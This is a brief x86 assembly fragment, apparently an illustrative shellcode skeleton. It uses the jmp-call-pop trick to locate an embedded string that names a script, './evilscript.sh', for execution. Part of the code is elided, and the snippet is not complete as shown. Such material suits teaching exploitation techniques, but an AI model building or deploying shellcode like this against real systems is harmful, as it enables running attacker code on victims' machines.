	section	.text
_shellcode_init:
	jmp	_shellcode_get_cmd
	pop	ecx
	...
_shellcode_get_cmd:
	call	_shellcode
	db	"./evilscript.shAAAA"
